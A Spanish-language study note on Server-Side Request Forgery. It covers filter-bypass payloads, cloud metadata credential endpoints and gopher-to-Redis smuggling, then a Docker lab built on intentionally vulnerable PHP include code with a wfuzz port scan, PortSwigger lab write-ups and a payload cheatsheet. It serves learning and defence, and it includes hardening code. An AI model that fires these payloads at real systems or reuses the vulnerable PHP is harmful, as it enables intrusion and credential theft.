---
aliases:
  - SSRF
  - Server-Side Request Forgery
tags:
  - sec/web
  - sec/web/ssrf
  - sec/redes
tipo: concepto
estado: terminado
creado: 2026-10-11
actualizado: 2026-10-11
relacionado:
  - "[[HTTP Host header attacks]]"
  - "[[Envenenamiento de Caché Web]]"
  - "[[Vulnerabilidad de Redirección Abierta]]"
  - "[[Remote File Inclusion RFI]]"
  - "[[Abuso de APIs]]"
  - "[[XML External Entity Injection]]"
fuente: "https://portswigger.net/web-security/ssrf"
---
# Server-Side Request Forgery (SSRF)

El **Server-Side Request Forgery** (**SSRF**) es una vulnerabilidad en la que un atacante **fuerza al servidor a realizar peticiones de red en su nombre**, controlando la URL o parte de ella. Como la petición nace *dentro* de la red del servidor (loopback, red interna, servicios cloud), el atacante obtiene un **proxy de red privilegiado**: alcanza hosts inalcanzables desde Internet, lee el metadata de la nube, habla con servicios que confían en el origen local y, en el mejor de los casos, encadena a RCE.

> [!info] SSRF vs CSRF
> En el **CSRF** el navegador del usuario víctima envía la petición (el atacante solo la diseña). En el **SSRF** el **servidor** la envía: el atacante no necesita engañar a ningún usuario ni que haya sesión — basta una entrada de URL que el backend consuma. También difiere de [[Remote File Inclusion RFI|RFI]]: RFI busca *ejecutar* un archivo remoto; SSRF busca *que el servidor haga la petición* (aunque ambas comparten el requisito de controlar una URL).

## Mecánica: anatomía de una URL y cómo la parsea cada capa

Una URL no es un string — es una estructura con gramática propia (RFC 3986) que los distintos componentes parsean **con reglas distintas**. Todo bypass de SSRF nace de una divergencia de parseo:

```
scheme://userinfo@host:puerto/ruta?query=fragmento
│    │      │      │   │
│    │      │      │   └─ puerto: 1-65535; omitido = default del esquema
│    │      │      └────── host: dominio o IP (IPv4, IPv6 entre [ ], decimal, hex…)
│    │      └───────────── userinfo: "usuario:clave@" — el navegador toma todo lo anterior al ÚLTIMO @ como host real
│    └──────────────────── esquema: http, https, gopher, dict, file, ftp, ftps…
└───────────────────────── jerarquía obligatoria tras el esquema
```

| Componente | Ejemplo | Vector de bypass |
|---|---|---|
| **scheme** | `http://` | Si el filtro solo bloquea `http`, probar `https`, `gopher`, `dict`, `file` |
| **userinfo** | `http://whitelisted.com@127.0.0.1/` | El host real es lo que va **tras el último `@`**; el filtro ve el dominio blanco |
| **host** | `127.0.0.1` | Representaciones alternativas: decimal `2130706433`, hex `0x7f000001`, octal `0177.0.0.1`, IPv6 `[::1]`, IPv4-mapped `[::ffff:127.0.0.1]`, `0.0.0.0`, `127.1`, `localhost`, DNS propio `spoofed.burpcollaborator.net` → 127.0.0.1 |
| **puerto** | `:8080` | Fuzzing de puertos internos vía el parámetro |
| **ruta/query** | `/admin?x=` | Path traversal en servicios (Elasticsearch `/_cat`, actuator `/env`) |
| **fragmento** | `#` | Corta la lectura del filtro en parseadores que no lo descartan |

> [!warning] La regla de oro del SSRF
> El filtro y el cliente HTTP (curl, `requests`, la librería del lenguaje) pueden **discrepar** sobre cuál es el host. `requests` de Python, por ejemplo, parsea el userinfo y el host según WHATWG URL, mientras un regex del defensor busca `localhost` en el string crudo. Cada bypass de esta nota es una instancia de esa discrepancia.

## Catálogo de bypass de filtros

| Filtro | Bypass |
|---|---|
| Blacklist `localhost` | `127.0.0.1`, `2130706433` (decimal), `0x7f000001`, `017700000001` (octal), `[::1]`, `[::ffff:7f00:1]`, `0`, `0.0.0.0`, `127.1`, `localtest.me` (A→127.0.0.1), `spoofed.burpcollaborator.net` (DNS propio) |
| Blacklist `admin` | Doble URL-encoding `%2561dmin` (si hay doble decodificación), `%61dmin` |
| Whitelist solo `internal.com` | `http://internal.com@evil.com`… no: al revés — `http://evil.com@internal.com` no sirve; el truco es `http://internal.com%23@evil.com`… el bueno: `http://internal.com@127.0.0.1` → host `127.0.0.1`, filtro ve `internal.com`; o **open redirect** en un dominio permitido: `http://internal.com/redirect?url=http://169.254.169.254/` seguido por el backend |
| Bloqueo de `http://` directo | Open redirect legítimo (ver [[Vulnerabilidad de Redirección Abierta]]) + follow de redirecciones |
| DNS estático del filtro | **DNS rebinding**: el hostname resuelve primero a IP pública (pasa el filtro) y en la segunda consulta (conexión) a IP interna — herramientas: `rbndr.us`, DNS propio con TTL 0 |
| Blacklist por extensión/dominio | Encadenar con un servicio que haga SSRF propio (webhook, preview de URL, pdf generator) |
| Solo se permite un esquema | Cambiar a `gopher://`, `dict://`, `file://` si el backend los soporta (urllib de Python históricamente sí) |

### IPv6, decimales y formas cortas — referencia rápida

```text
127.0.0.1      →  2130706433            (decimal: 127·256³ + 0·256² + 0·256 + 1)
               →  0x7F000001            (hex)
               →  0177.0.0.1            (octal por cuarteto)
               →  127.1                  (forma corta: último octeto = host completo)
               →  [::1]                 (IPv6 loopback)
               →  [::ffff:127.0.0.1]    (IPv4-mapped)
               →  [0:0:0:0:0:ffff:7f00:1]
169.254.169.254 →  2852039166            (decimal del metadata AWS/Azure)
```

## Cloud metadata: la cadena favorita

Los proveedores cloud exponen un servidor de metadata **en la propia VM**, accesible solo desde dentro. Si el SSRF puede alcanzar esa IP, obtiene credenciales de la instancia.

| Proveedor | Endpoint | Requisitos |
|---|---|---|
| **AWS** | `http://169.254.169.254/latest/meta-data/` | IMDSv1: nada. IMDSv2: primero un token |
| **GCP** | `http://metadata.google.internal/computeMetadata/v1/` o `169.254.169.254` | Header obligatorio: `Metadata-Flavor: Google` |
| **Azure** | `http://169.254.169.254/metadata/instance?api-version=2021-02-01` | Header: `Metadata: true` |
| **DigitalOcean** | `http://169.254.169.254/metadata/v1/` | Ninguno |
| **Alibaba** | `http://10.0.0.1/latest/meta-data/` (o `100.100.100.200`) | Ninguno |
| **OpenStack** | `http://169.254.169.254/openstack/latest/meta_data.json` | Ninguno |

### IMDSv2 (AWS, defensa moderna)

```bash
# 1. Pedir token (con límite de TTL)
curl -X PUT "http://169.254.169.254/latest/api/token" \
     -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"
# → TOKEN
# 2. Usarlo en cada consulta
curl -H "X-aws-ec2-metadata-token: $TOKEN" \
     "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
```

Un SSRF simple que solo controla la URL **no** puede hacer el PUT+header → IMDSv2 rompe la cadena. Pero un SSRF que además permite **controlar métodos y headers** (API GraphQL, proxy con custom headers) sí puede. Ruta de exfiltración típica:

```text
SSRF → metadata → rol IAM (ej. s3:*) → credenciales temporales → acceso S3/otros servicios → account takeover / RCE en servicios managed
```

## Protocol smuggling: gopher, dict, file

Cuando el backend usa una librería genérica de URLs (Python `urllib`/`requests` antiguos, PHP con `allow_url_fopen`, Java `URL`), el esquema **no** se limita a HTTP:

| Esquema | Capacidad | Uso en ataque |
|---|---|---|
| `gopher://host:port/_PAYLOAD` | Escribe **bytes arbitrarios** (con `%0d%0a` = CRLF) sobre cualquier TCP | Hablar Redis (SET webshell), Memcached (poison de sesiones), SMTP, MySQL — **gopher es el "curl multinivel" del SSRF** |
| `dict://host:port/` | Protocolo DICT: comandos simples | Probar puertos, lectura de servicios |
| `file:///etc/passwd` | Lectura de archivos locales | Equivale a LFI — ver [[Local File Inclusion]] |
| `ftp://`, `tftp://` | Transferencias antiguas | Subida/lectura en configsFTP antiguas |

> [!warning] Modernidad
> `requests` (Python ≥2.x moderno) y las librerías actuales de Go/Java **no** soportan gopher/file por defecto; el protocol smuggling vive en stacks legacy, librerías mal configuradas y en puertos de servicio internos que hablan texto (Redis sin auth, Elasticsearch). Probar siempre los esquemas alternativos cuando el filtro solo mira `http`.

## SSRF ciego: oráculos

Muchos SSRF no devuelven la respuesta ("URL verificada, sin output"). El atacante trabaja por **oráculos indirectos**:

| Oráculo | Cómo se explota |
|---|---|
| **DNS OOB** | Hostname único por payload (`<random>.burpcollaborator.net`): la resolución confirma ejecución aunque no haya respuesta |
| **HTTP OOB** | El backend hace fetch a tu servidor (colaborador/webhook) con headers identificativos |
| **Time-based** | Conectar a puertos filtrados tarda (TCP timeout ~21s) vs puertos abiertos (rápido) → mapeo de puertos interno |
| **Diferencia de respuesta** | Longitud/estado/cuerpo distinto según exista el host/ruta |
| **Errores diferenciados** | "connection refused" vs "timeout" vs "HTTP 404" en el mensaje de error |
| **DNS rebinding oráculo** | Para el timing entre dos resoluciones |

Blind SSRF típico → impacto: en PortSwigger, un `Referer` que el backend resuelve permite (a) confirmar OOB, (b) descubrir la IP interna del servidor vulnerable con Intruder, y (c) detonar [[Shellshock Vulnerabilidad en Bash|Shellshock]] en un CGI interno — RCE encadenada.

## Metodología completa

1. **Descubrir el punto**: parámetros tipo `url`, `uri`, `path`, `dest`, `endpoint`, `callback`, `webhook`, `img`, `feed`, `load`, `fetch`, `site`, `domain`, `host`, `ip`, `ping`, `report`, `preview` en GET/POST/JSON/headers (`Referer`, `X-Forwarded-Host`) — el Referer fue el vulnerable en los labs de PortSwigger: probar **todas** las entradas.
2. **Clasificar**: ¿refleja el contenido (full)? ¿solo status? ¿solo "OK/not OK" (blind)? ¿interacción OOB?
3. **Confirmar control**: `http://TU-COLLABORATOR.net` → interacción; luego `http://127.0.0.1` → diferencia de respuesta.
4. **Mapa interno**: fuzzing de puertos (`wfuzz -z range,1-65535`) y hosts (`192.168.0.0/24`) vía el SSRF; identificar servicios y versiones.
5. **Bypass de filtros**: recorrer el catálogo (representaciones de IP, userinfo, doble encoding, open redirect, DNS rebinding).
6. **Pivote de alto valor**: `http://localhost/admin`, metadata cloud, APIs internas (Elastic, actuator, Kubernetes `10.96.0.1:443`, Redis vía gopher).
7. **Escalada**: metadata → credenciales cloud; gopher → Redis/Memcached → RCE; [[Shellshock Vulnerabilidad en Bash|Shellshock]] en CGI interno.
8. **Blind → semi-blind**: convertir OOB en puerto/acceso con colaborador + timing.

## Defensa (con código)

### 1. Allowlist + parseo — nunca string matching

```python
# VULNERABLE: filtro de string
if "localhost" in url or url.startswith("http://127."):
    bloquear(url)
fetch(url)   # 2130706433, [::1], 0x7f000001… lo pasan

# SEGURO: parsear y comparar contra allowlist de hosts + IP pública resuelta
from urllib.parse import urlparse
import ipaddress, socket

def es_url_segura(url: str, allow: set[str]) -> bool:
    p = urlparse(url)
    if p.scheme not in ("http", "https"):        # sin gopher/dict/file
        return False
    if p.username or p.password:                   # sin userinfo confuso
        return False
    host = p.hostname
    if host not in allow:                          # igualdad exacta, no contains
        return False
    try:
        ips = [ipaddress.ip_address(socket.gethostbyname(host))]
    except OSError:
        return False
    return all(not (i.is_private or i.is_loopback or i.is_link_local
                    or i.is_reserved or i.is_multicast) for i in ips)
```

### 2. Egress filtering (la defensa que escala)

- Firewall de salida: los servidores web **solo** hacia Internet por proxy saliente autenticado; bloquear rangos RFC1918, `169.254.0.0/16`, `100.64.0.0/10`, loopback.
- Cloud: *IMDSv2 obligatorio* (`HttpPutResponseHopLimit=1`), y políticas IAM de mínimo privilegio por instancia.
- DNS interno: no resolver nombres externos desde el segmento de servidores.

### 3. Código que no sigue redirecciones ni acepta métodos arbitrarios

```java
// Java: deshabilitar follow-redirects y limitar esquemas
HttpClient client = HttpClient.newBuilder()
    .followRedirects(HttpClient.Redirect.NEVER)   // rompe open-redirect chains
    .build();
```

```ini
; PHP: apagar la capacidad de red de los wrappers
allow_url_fopen = Off       ; bloquea http:// en include/file_get_contents
```

### 4. Arquitectura

- Separar la funcionalidad "fetch de URLs" en un servicio aislado (red restringida, sin metadata, sin acceso a la red interna).
- Validar dominio **antes** de la petición y en cada redirect seguido.

> [!tip] Laboratorio propio
> En las notas de práctica de esta nota se construye desde cero un entorno Docker con red interna (`docker network create --driver=bridge network1 --subnet=10.10.0.0/24`) para practicar el pivote producción→preproducción.

En esta clase, estaremos utilizando **Docker** para crear **redes personalizadas** en las que podremos simular un escenario de **red interna**. En esta red interna, intentaremos a través del SSRF apuntar a un recurso existente que no es accesible externamente, lo que nos permitirá explorar y comprender mejor la explotación de esta vulnerabilidad.

Para crear una nueva red en Docker, podemos utilizar el siguiente comando:

`docker network create --subnet=<subnet> <nombre_de_red>`

Donde:

- **subnet**: es la dirección IP de la subred de la red que estamos creando. Es importante tener en cuenta que esta dirección IP debe ser única y no debe entrar en conflicto con otras redes o subredes existentes en nuestro sistema.
- **nombre_de_red**: es el nombre que le damos a la red que estamos creando.

Además de los campos mencionados anteriormente, también podemos utilizar la opción `--driver` en el comando `docker network create` para especificar el controlador de red que deseamos utilizar.

> [!info]
> Docker soporta varios controladores de red para diferentes escenarios. Los más comunes son:
> - **`bridge`**: El controlador de red predeterminado. Los contenedores en la misma red `bridge` pueden comunicarse entre sí. Los contenedores pueden comunicarse con el host Docker a través de la interfaz `docker0`.
> - **`overlay`**: Permite que los contenedores se comuniquen a través de múltiples hosts Docker, ideal para clústeres de Swarm.
> - **`macvlan`**: Asigna una dirección MAC a un contenedor, haciéndolo aparecer como un dispositivo físico en la red. Útil para integrar contenedores directamente en una red física existente.
> - **`ipvlan`**: Similar a `macvlan`, pero permite un control más granular sobre las direcciones IP y las subredes.

Por ejemplo, si queremos crear una red de tipo "**bridge**", podemos utilizar el siguiente comando:

`docker network create --subnet=<subnet> --driver=bridge <nombre_de_red>`

En este caso, estamos utilizando la opción `--driver=bridge` para indicar que deseamos crear una red de tipo "**bridge**". La opción `--driver` nos permite especificar el controlador de red que deseamos utilizar, que puede ser "**bridge**", "**overlay**", "**macvlan**", "**ipvlan**" u otro controlador compatible con Docker.


## Notas de la práctica

El primer escenario de ataque:

![[Pasted image 20250825200346.png]]

En este escenario vamos a tener dos entornos: uno de producción (el cual podremos ver) y otro de preproducción que es interno y no podremos ver, ya que será solo accesible internamente.
Entonces, la idea es que veremos el puerto 80 abierto, pero el puerto 8089 no será accesible de forma externa.

La idea es que el servicio web en el puerto 80 tenga una funcionalidad de buscador que nos permita realizar búsquedas; por ejemplo, si le pasamos `google.com`, nos muestre la página.

Esto lo vamos a configurar desde cero, por lo que solo vamos a ir escribiendo los comandos:

- `docker pull ubuntu:latest`
- `docker run -dit --name ssrf_fist_lab ubuntu`
- `docker exec -it ssrf_fist_lab bash` -> ingresamos para instalar las dependencias necesarias en el contenedor.
- `apt install apache2 php nano python3 lsof`
- `service apache2 start` -> con la IP del Docker ya podemos ver la web por defecto de Apache, pero la vamos a cambiar.
- Eliminamos el `index.html` y el archivo `utility.php` lo creamos con el siguiente contenido:
```php
<?php
        if(isset($_GET['url'])){
                $url = $_GET['url'];
                echo "\n[+] listando el contenido de la web " . $url . ":\n\n";
                include($url);
        } else{
                echo "\n[!] No se puso la url\n";
        }
?>
```

- Por último, vamos a tener un `login.html`:
```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login Form</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f4;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
        }

        .login-container {
            background-color: #fff;
            padding: 30px;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            width: 300px;
            text-align: center;
        }

        h2 {
            margin-bottom: 20px;
            color: #333;
        }

        .form-group {
            margin-bottom: 15px;
            text-align: left;
        }

        label {
            display: block;
            margin-bottom: 5px;
            color: #555;
        }

        input[type="text"],
        input[type="password"] {
            width: calc(100% - 20px);
            padding: 10px;
            border: 1px solid #ddd;
            border-radius: 4px;
            box-sizing: border-box;
        }

        button {
            background-color: #007bff;
            color: white;
            padding: 10px 15px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            width: 100%;
            font-size: 16px;
        }

        button:hover {
            background-color: #0056b3;
        }

        #message {
            margin-top: 15px;
            color: red;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <h2>Login</h2>
        <form id="loginForm">
            <div class="form-group">
                <label for="username">Username:</label>
                <input type="text" id="username" name="username" required>
            </div>
            <div class="form-group">
                <label for="password">Password:</label>
                <input type="password" id="password" name="password" required>
            </div>
            <button type="submit">Login</button>
        </form>
        <div id="message"></div>
    </div>

    <script>
        document.getElementById('loginForm').addEventListener('submit', function(event) {
            event.preventDefault(); // Prevent default form submission

            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            const messageDiv = document.getElementById('message');

            // Simple client-side validation (replace with server-side authentication)
            if (username === 'user' && password === 'pass') {
                messageDiv.style.color = 'green';
                messageDiv.textContent = 'Login successful!';
                // In a real application, you would redirect to another page or set a session
            } else {
                messageDiv.style.color = 'red';
                messageDiv.textContent = 'Invalid username or password.';
            }
        });
    </script>
</body>
</html>
```

- Dentro del directorio `tmp` nos copiamos el HTML y lo ponemos de igual manera con algo representativo y ya está. Para levantar el servidor vamos a usar: `python3 -m http.server 4646 --bind 127.0.0.1` con esto ya tenemos los dos servicios listos.

Comenzamos.

Lo primero que hacemos es ver si podemos referenciar a la propia máquina enviando una solicitud al `localhost`:

![[Pasted image 20250825204150.png]]

Como vemos, sí nos lo permite. Ahora esto nos abre una posibilidad de ver puertos abiertos en el sistema de la siguiente manera:

![[Pasted image 20250825204421.png]]

Como vemos en la URL, sería cuestión de ir cambiando los puertos, pero podemos darnos cuenta mediante un fuzzing de la siguiente manera:

```bash
wfuzz -c --hl=3 -t 200 -z range,1-65535 "http://172.17.0.2/utility.php?url=http://127.0.0.1:FUZZ"
```

> [!tip]
> `wfuzz` es una herramienta potente para fuzzing de aplicaciones web. En este comando:
> - `-c`: Muestra la salida con colores.
> - `--hl=3`: Oculta las respuestas con 3 líneas (útil para filtrar errores o respuestas vacías).
> - `-t 200`: Establece 200 hilos para un fuzzing más rápido.
> - `-z range,1-65535`: Define el payload como un rango numérico desde 1 hasta 65535, que son los puertos TCP/UDP posibles.
> - `"http://172.17.0.2/utility.php?url=http://127.0.0.1:FUZZ"`: Es la URL objetivo, donde `FUZZ` será reemplazado por cada valor del rango de puertos. Esto permite al servidor vulnerable intentar conectarse a sus propios puertos, y la respuesta de `utility.php` revelará si la conexión fue exitosa (indicando un puerto abierto).

![[Pasted image 20250825204653.png]]

Miramos que en realidad logramos el cometido: la máquina está haciendo una consulta a sí misma y nos figura el puerto 4646 que no está expuesto como abierto.
Por lo tanto, vamos a tratar de entrar mediante este buscador que tiene la propia máquina:

![[Pasted image 20250825204843.png]]

Como podemos ver, ya logramos ver información privilegiada mediante un SSRF.

Ahora procedemos a complicarlo un poco, donde el diagrama será de la siguiente manera:
![[Pasted image 20250825205000.png]]

En este caso, vamos a tener dos máquinas: una la cual expone la página principal al público y otra máquina la cual contiene la página de preproducción. Ambas máquinas, tanto la de producción como la de preproducción, se encuentran en el mismo segmento de red, por lo que se ven entre sí.

- Primero creamos una red con `docker network create --driver=bridge network1 --subnet=10.10.0.0/24`
- Luego creamos el primer contenedor `docker run -dit --name produccion ubuntu`
- Ahora vamos a configurar la red que creamos `docker network connect network1 produccion`

> [!info]
> El comando `docker network connect <network_name> <container_name>` es crucial para añadir un contenedor a una red Docker existente. Un contenedor puede estar conectado a múltiples redes, lo que le permite comunicarse con otros contenedores en esas redes. En este escenario, el contenedor `produccion` estará en la red `bridge` predeterminada de Docker (para acceso externo) y en `network1` (para acceso a la red interna simulada).

![[Pasted image 20250825210234.png]]
Ya tenemos las dos redes en la primera máquina, la cual va a tener la página de producción.

Ahora vamos a configurar la máquina de preproducción: `docker run -dit --name preProduccion --network=network1 ubuntu`

![[Pasted image 20250825210529.png]]

Como podemos observar, ya tenemos la segunda máquina lista.

Por último, vamos a desplegar un Docker de atacante: `docker run -dit --name atacante ubuntu`.
Esta máquina no tendrá acceso a la subred `network1` y solo podrá acceder a la máquina de producción, no a la de preproducción.

![[Pasted image 20250825210842.png]]

Ya tenemos listas todas las máquinas. Ahora solo vamos a realizar la configuración, primero de la máquina de producción:
`apt install apache2 php nano`
`service apache2 start`
El código de `utility.php` va a ser mucho más directo:
```php
<?php
	include($_GET['url']);
?>
```

Por último, modificamos el archivo `php.ini` para que nos permita cargar contenido igual que en el primer entorno.
El código del `login.html` va a ser el mismo y ya está listo.

Ahora, la máquina de preproducción no es más que en `tmp` crear un `index.html` con cualquier contenido o el mismo login, pero con algo que lo diferencie para saber cuál página es cuál, y luego levantamos el servidor Python por un puerto: `python3 -m http.server 7878`.

Por último, en la máquina de atacante vamos a instalar `curl` y comenzamos.

En general, con `curl` y usando la ruta del `utility.php` de la primera máquina, podemos conectarnos a la tercera, lo que quiere decir que podemos ver contenido de la máquina interna gracias a la máquina de producción.
![[Pasted image 20250825212402.png]]

En la imagen vemos cómo usamos el comando `curl` y el `utility.php` para enviar una petición como si fuera la máquina de producción, y por esto la máquina que está en el otro segmento de red responde con normalidad.


## PortSwigger

### Lab: Basic SSRF against the local server

Para este laboratorio, tenemos que tratar de explotar la vulnerabilidad que al parecer se encuentra al verificar el stock de los productos:
![[Pasted image 20250916203858.png]]

Vemos cómo se está efectuando la petición, pero tenemos un parámetro algo curioso, el cual es `stockApi`. Vamos a quitarle el URL-encode a ver qué contiene, aunque por lo que se logra observar un `http`, podemos pensar que es un enlace o una URL:
![[Pasted image 20250916204038.png]]

Vemos que sí, efectivamente es una URL, y en este punto vamos a ver si puede ser inyectable a un SSRF:
![[Pasted image 20250916204147.png]]

Efectivamente, vemos los usuarios y el panel de administrador que tenemos allí. Esto no debería ser accesible, pero al ejecutar la petición desde la misma máquina, sí es válido.

El objetivo es eliminar el usuario `carlos`. Es complicado hacerlo por la interfaz, entonces toca buscar el vínculo de cómo se tramita la petición y enviarlo así para lograr eliminarlo:
![[Pasted image 20250916204904.png]]

Perfecto, vamos a tramitar de esa forma la petición para ver qué sucede:
![[Pasted image 20250916204956.png]]

Al enviar la petición, sucedió una redirección (follow redirect) y es por eso que no vemos directamente la petición, pero con esto ya estamos:
![[Pasted image 20250916205059.png]]

Lab Terminado.


### Lab: Basic SSRF against another back-end system

En este laboratorio, el objetivo es encontrar directamente el panel de administración. No sabemos la IP, entonces vamos a buscarla:
![[Pasted image 20250916205733.png]]

En este punto, lo que tenemos que hacer es realizar un escaneo con Burp Suite o con otra herramienta para los 254 dispositivos y encontrar el panel administrativo `admin`:
![[Pasted image 20250916210545.png]]

Logramos encontrar la IP `192.168.0.179` donde sí tenemos el `admin` de igual forma. Ahora vamos a enviar la URL para eliminar el usuario `carlos`:
![[Pasted image 20250916210818.png]]
Ya se envió de igual forma:

![[Pasted image 20250916210841.png]]

Lab Terminado.

### Lab: Blind SSRF with out-of-band detection

Este laboratorio es relativamente sencillo. Lo que vamos a hacer es enviarnos una petición a nuestro Burp Collaborator.

Vamos primero a capturar la petición principal:
![[Pasted image 20250916212536.png]]

Como vemos, el lugar inyectable en este punto es el `Referer`. Recordemos que tenemos que probar de todo y en todo, ya que nosotros no sabemos cómo se están construyendo las webs. En este caso, el `Referer` fue el vulnerable y si vemos el Collaborator, vamos a ver las peticiones:
![[Pasted image 20250916212802.png]]

![[Pasted image 20250916212812.png]]
Con esto tenemos el Lab Resuelto.


### Lab: SSRF with blacklist-based input filter

En este laboratorio tendremos un problema y es que tenemos que lograr obtener la información de la web `localhost/admin`, pero tienen empleada una blacklist la cual no permite el `localhost`.

![[Pasted image 20250917213416.png]]

Vemos cómo está conformada la petición y lo que vamos a hacer es intentar ver dentro de `localhost/admin`:
![[Pasted image 20250917213501.png]]

Vemos que nos lo detecta. Es aquí donde tenemos que tratar de burlar la protección:
![[Pasted image 20250917213738.png]]

Tampoco funciona, pero nosotros podemos intentar otro tipo de representación, como representarlo de forma hexadecimal:
![[Pasted image 20250917213900.png]]

Lo que vamos a representar de la siguiente manera: `0x7f000001`:
![[Pasted image 20250917213959.png]]

Tampoco funciona. Vamos a intentar representarlo en decimal:
![[Pasted image 20250917214642.png]]

Lo que hacemos es poner el valor multiplicado por 256 elevado a su posición, contando desde el 0 y desde la derecha. Vamos a intentarlo:
![[Pasted image 20250917214843.png]]

Tampoco funciona. En este punto podemos pensar que más que ser `localhost` es la cadena `admin`. Podemos probar sin ella a ver si logramos algo:
![[Pasted image 20250917214943.png]]

Efectivamente, es la cadena `admin`. En este punto, lo que vamos a hacer es comenzar a probar un doble URL-encode haciendo lo siguiente:
![[Pasted image 20250917215212.png]]

En la primera tenemos la primera letra en URL-encode, pero vamos a hacer lo mismo para el `%`. El propósito es lograr que en la primera pasada el servidor interprete el `%` y luego lo decodifique a la `a` para que se entienda como `admin`:
![[Pasted image 20250917215415.png]]

Ahora sí, enviemos a ver si logramos pasar:
![[Pasted image 20250917215450.png]]

Perfecto, procedemos a eliminar el usuario Carlos:
![[Pasted image 20250917215527.png]]

Perfecto.
![[Pasted image 20250917215551.png]]

Lab Terminado.


### Lab: SSRF with filter bypass via open redirection vulnerability

En este punto, la vulnerabilidad se presenta mediante una redirección abierta (open redirect).

![[Pasted image 20250917220012.png]]

Bueno, en este caso vemos que también intenté que no se puede usar HTTP para ir a otras páginas, así que tenemos que buscar otro factor de ataque:
![[Pasted image 20250917220513.png]]

En uno de los botones encontramos esa forma de ir al siguiente producto mediante un parámetro. En este punto, lo que vamos a hacer es intentar hacer uso de ese parámetro en el stock a ver si funciona:
![[Pasted image 20250917221410.png]]

Logramos, intercambiando la URL, ver cómo funciona. Procedemos a eliminar la cuenta de Carlos:
![[Pasted image 20250917221508.png]]

![[Pasted image 20250917221530.png]]

Lab Terminado.


### Lab: Blind SSRF with Shellshock exploitation

En esta ocasión, lo que vamos a explotar es un `Shellshock` mediante un `SSRF` dentro del sistema. Esto es por pasos, ya que primero lo que vamos a buscar es la IP correspondiente y luego intentar el Shellshock para obtener el nombre de usuario.

Vamos a comenzar capturando la petición vulnerable, y en realidad es en el `Referer`:
![[Pasted image 20250917222210.png]]

En este punto, vamos a intentar encontrar el valor de posibles hosts:
![[Pasted image 20250917222737.png]]

Para el ataque, ponemos nuestra carga útil con el objetivo de enviar el nombre de usuario a un servidor del Collaborator mediante `nslookup`, pero como no sabemos cuál es la IP con el servidor vulnerable, vamos con el Intruder a enviar a todas las IP para que, si le atinamos a la correcta, podamos obtener el nombre de usuario como nos lo piden:

> [!warning]
> La vulnerabilidad **Shellshock** (CVE-2014-6271) afecta a la familia de shells Bash. Permite la ejecución de código arbitrario a través de variables de entorno especialmente diseñadas. En un contexto SSRF, si el servidor vulnerable utiliza Bash para procesar ciertas entradas (como cabeceras HTTP), un atacante podría inyectar una carga útil de Shellshock para ejecutar comandos en el sistema. La detección fuera de banda (out-of-band) con Burp Collaborator es clave para confirmar la explotación en escenarios ciegos, ya que el servidor vulnerable intentará resolver un dominio controlado por el atacante, revelando su IP o el resultado de un comando.

![[Pasted image 20250917223612.png]]

Bueno, vemos que sí nos retorna. Con esto ya tenemos el Lab Resuelto.

### Lab: SSRF with whitelist-based input filter

Este laboratorio es algo extraño, donde tenemos en el stock check el cual lanza datos al sistema interno y vamos a testearlo:
![[Pasted image 20250917223853.png]]

El objetivo es que se pueda realizar la petición a `http://localhost/admin`. En este punto, lo que vamos a hacer es intentar de forma directa a ver qué sucede:
![[Pasted image 20250917224042.png]]

Vemos que en este punto nos pide de forma clara ese dominio; nada de lo anterior nos permite pasar.

En este punto, debemos recordar que en las URLs a veces podemos incluir credenciales. Vamos a ver si la estructura nos lo permite:
![[Pasted image 20250917224427.png]]

Vemos que el error es diferente y que carga algo de contenido, lo que indica que estamos superando esa verificación. Ahora, ¿cómo vamos a hacer para irnos a `/admin`? Es de la siguiente manera:

![[Pasted image 20250917224750.png]]

Nos aprovechamos del `#` para que `@stock.weli...` sea interpretado como parte del host en lugar de credenciales. El `#` causó problemas, por lo que se realizó un doble URL-encode tanto al `#` como al `%` para asegurar su correcta interpretación. Vemos que carga y podemos ya intentar entrar a `admin`:
![[Pasted image 20250917225015.png]]

Perfecto, ya podemos eliminar el usuario `carlos`:
![[Pasted image 20250917225052.png]]

![[Pasted image 20250917225103.png]]

Lab Terminado.

## Errores comunes

**Del atacante:**
1. Probar solo `localhost`/`127.0.0.1` y rendirse con un filtro: siempre recorrer el catálogo de representaciones (decimal, hex, IPv6, DNS propio).
2. Ignorar headers como `Referer` o `X-Forwarded-Host` como vectores: el lab blind de PortSwigger era exactamente eso.
3. No mirar el follow-redirect: un `302` del backend hacia metadata es el bypass más limpio de whitelist.
4. En cloud, detenerse en la lectura de metadata sin explotar el rol IAM: la cadena real continúa con las credenciales temporales.
5. Olvidar gopher/dict/file al ver un backend "moderno": verificar con un esquema benigno si el parser los acepta.
6. Confundir SSRF con XSPA (cross-site port scan): el primero exfiltra contenido, el segundo solo mapea puertos por timing.

**Del defensor:**
1. Filtrar por string (`blacklist localhost`) en vez de parsear la URL y comparar la IP resuelta.
2. Validar solo la URL inicial y seguir redirects ciegamente: cada redirect debe re-validarse.
3. No bloquear egress en firewall: la validación en código falla alguna vez; la red es la red de defensa.
4. Dejar IMDSv1 activo (v1 no exige token) en instancias cloud.
5. Exponer el metadata service y la red interna en la misma segmentación que los servidores web.

## Cheatsheet

| Paso | Payload / acción |
|---|---|
| Confirmar OOB | `http://TU-COLLABORATOR.net/t` |
| Loopback | `http://127.0.0.1:PUERTO`, `http://localhost/admin` |
| Decimal | `http://2130706433/` (127.0.0.1), `http://2852039166/` (metadata) |
| Hex / octal | `http://0x7f000001/`, `http://0177.0.0.1/` |
| IPv6 | `http://[::1]/`, `http://[::ffff:127.0.0.1]/` |
| Userinfo | `http://whitelisted.com@127.0.0.1/` |
| DNS propio | `http://spoofed.COLLAB.net/` → A record a 127.0.0.1 |
| Open redirect chain | `http://permitido.com/redirect?url=http://169.254.169.254/` |
| AWS metadata | `http://169.254.169.254/latest/meta-data/iam/security-credentials/` |
| GCP | `http://metadata.google.internal/computeMetadata/v1/` + `Metadata-Flavor: Google` |
| Azure | `http://169.254.169.254/metadata/instance` + `Metadata: true` |
| Redis vía gopher | `gopher://127.0.0.1:6379/_SET%20clave%20valor` |
